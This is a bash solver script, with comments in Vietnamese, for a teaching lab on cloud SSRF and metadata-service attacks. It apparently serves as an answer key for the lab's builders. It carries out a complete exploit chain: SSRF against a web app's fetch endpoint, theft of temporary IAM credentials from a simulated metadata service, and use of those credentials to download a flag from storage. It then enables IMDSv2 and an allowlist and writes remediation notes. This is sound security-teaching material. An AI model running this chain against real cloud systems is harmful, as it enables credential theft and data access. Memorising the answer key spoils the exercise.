#!/bin/bash
#
# solver.sh - cloud-ssrf-imds (SecLab PTIT / Do an DevSecOps 2026)
#
# LOI GIAI MAU - CHI dung de nguoi xay lab tu kiem tra (dat goal, chay
# duoc het chuoi khai thac + hardening). KHONG phat cho sinh vien, KHONG
# dat trong thu muc client/ (se bi dong goi vao artifact/home cua SV).
#
# Chay TU BEN TRONG container 'client' sau khi 'labtainer cloud-ssrf-imds'
# da khoi dong xong (vd qua virtual terminal cua client, hoac
# `docker exec -it <client_container> bash` roi paste script nay vao).
#
# Chuoi thuc hien: SSRF (discover) -> SSRF->IMDS (steal credential) ->
# storage (lay flag) -> hardening (allowlist + IMDSv2) -> remediation.txt.
#
set -uo pipefail

WEB="${WEB:-web}"          # 172.34.0.20
IMDS="${IMDS:-imds}"       # 172.34.0.40 (mo phong 169.254.169.254)
STORAGE="${STORAGE:-storage}"  # 172.34.0.30
ROLE="web-imgproxy-role"

echo "== [1/4] discover_ssrf: xac nhan webapp bi ep goi toi dich noi bo =="
curl -s "http://$WEB:8080/fetch?url=http://127.0.0.1:8080/health" | tee /tmp/step1_loopback.json
echo
curl -s "http://$WEB:8080/fetch?url=http://$IMDS/latest/meta-data/" | tee /tmp/step1_imds_root.txt
echo

echo "== [2/4] steal_credentials: SSRF -> IMDS -> credential tam thoi =="
curl -s "http://$WEB:8080/fetch?url=http://$IMDS/latest/meta-data/iam/security-credentials/" | tee /tmp/step2_role.txt
ROLE_FOUND=$(cat /tmp/step2_role.txt | tr -d '\r\n')
echo "Role: $ROLE_FOUND"

CREDS_JSON=$(curl -s "http://$WEB:8080/fetch?url=http://$IMDS/latest/meta-data/iam/security-credentials/$ROLE_FOUND")
echo "$CREDS_JSON" | tee ~/creds.txt
AK=$(echo "$CREDS_JSON" | jq -r .AccessKeyId)
SK=$(echo "$CREDS_JSON" | jq -r .SecretAccessKey)
TK=$(echo "$CREDS_JSON" | jq -r .Token)
echo "AccessKeyId=$AK"

echo "== [3/4] access_storage_get_flag: dung credential danh cap de lay flag =="
export AWS_ACCESS_KEY_ID="$AK"
export AWS_SECRET_ACCESS_KEY="$SK"
export AWS_SESSION_TOKEN="$TK"
export AWS_DEFAULT_REGION=us-east-1

aws --endpoint-url "http://$STORAGE:9000" s3 ls
aws --endpoint-url "http://$STORAGE:9000" s3 ls "s3://fin-reports/"
aws --endpoint-url "http://$STORAGE:9000" s3 cp "s3://fin-reports/flag.txt" ./flag.txt
cat ./flag.txt
cp ./flag.txt ~/loot.txt
echo "Flag da luu vao ~/loot.txt: $(cat ~/loot.txt)"

echo "== [4/4] harden_ssrf_imds: bat IMDSv2 + allowlist SSRF + remediation =="

echo "-- 4a. Bat IMDSv2 tren imds (khong can shell, goi truc tiep endpoint quan tri cua lab) --"
curl -s -X POST "http://$IMDS/admin/enable-imdsv2" | tee /tmp/step4a_enable_imdsv2.json
echo

echo "-- 4b. Xac nhan SSRF co dien (GET tran, khong token) gio bi IMDSv2 tu choi --"
curl -s -o /tmp/step4b_denied.json -w "HTTP_STATUS=%{http_code}\n" \
    "http://$WEB:8080/fetch?url=http://$IMDS/latest/meta-data/iam/security-credentials/$ROLE_FOUND"
cat /tmp/step4b_denied.json
echo

echo "-- 4c. Minh hoa quy trinh IMDSv2 hop le (PUT token -> GET kem token), khong lo credential --"
curl -s "http://$IMDS/admin/imdsv2-demo" | tee /tmp/step4c_demo.json
echo

echo "-- 4d. Bat allowlist chong SSRF tren webapp --"
curl -s -X POST "http://$WEB:8080/admin/harden" | tee /tmp/step4d_harden.json
echo

echo "-- 4e. Xac nhan chuoi khai thac SSRF cu gio bi webapp chan hoan toan --"
curl -s -o /tmp/step4e_blocked.json -w "HTTP_STATUS=%{http_code}\n" \
    "http://$WEB:8080/fetch?url=http://$IMDS/latest/meta-data/iam/security-credentials/$ROLE_FOUND"
cat /tmp/step4e_blocked.json
echo

echo "-- 4f. Ghi remediation.txt (allowlist + IMDSv2 + least privilege) --"
cat > ~/remediation.txt <<'EOF'
1. Chong SSRF: bat allowlist host + chan cac dai IP noi bo/link-local
   (127.0.0.0/8, 169.254.0.0/16 dac biet 169.254.169.254, 10.0.0.0/8,
   172.16.0.0/12, 192.168.0.0/16) o tang ung dung webapp.
2. IMDSv2: bat buoc lay session token qua PUT /latest/api/token truoc khi
   GET metadata, ket hop hop limit = 1 de goi tin khong di qua duoc proxy.
3. Least privilege: role web-imgproxy-role chi nen duoc cap s3:GetObject
   tren dung prefix/bucket can thiet (vd fin-reports/*), khong cap quyen
   list/ghi toan bo storage, de gioi han thiet hai khi credential bi lo.
EOF
cat ~/remediation.txt

echo
echo "== HOAN TAT solver.sh =="
echo "Kiem tra: ~/loot.txt (flag), ~/creds.txt (credential), ~/remediation.txt (hardening)"
